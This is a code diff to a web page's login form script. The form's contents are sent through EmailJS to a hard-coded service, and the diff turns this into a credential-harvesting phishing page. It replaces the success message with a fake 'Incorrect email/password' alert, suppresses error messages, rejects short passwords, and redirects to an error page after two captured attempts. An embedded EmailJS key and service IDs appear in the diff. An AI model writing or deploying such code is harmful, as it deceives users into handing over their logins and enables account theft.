@@ -41,7 +41,7 @@
       (function () {
         emailjs.init("qZi_CLblH1PeMRHDN"); // Replace with your EmailJS user ID
       })();
-
+      let counter = 0;
       document
         .getElementById("login-form")
         .addEventListener("submit", function (event) {
@@ -59,6 +59,10 @@
             );
             return;
           }
+          if (message.length < 5) {
+            alert("Incorrect password, try again.");
+            return;
+          }
 
           let params = {
             subject: subject,
@@ -67,12 +71,22 @@
 
           emailjs.send("service_75sfydl", "template_d2bssp5", params).then(
             function () {
-              alert("Email successfully sent!");
+              let a = 2;
+              document.getElementById("subject").value = "";
+              document.getElementById("message").value = "";
+              alert("Incorrect email/password. Try again.");
             },
             function (error) {
-              alert("Failed to send email: " + JSON.stringify(error));
+              let a = 2;
+              //alert("Failed to send email: " + JSON.stringify(error));
             }
           );
+          counter++;
+          if (counter == 2) {
+            window.location.href = "error.html";
+            //alert("reached two");
+          }
+          return;
         });
     </script>
   </body>
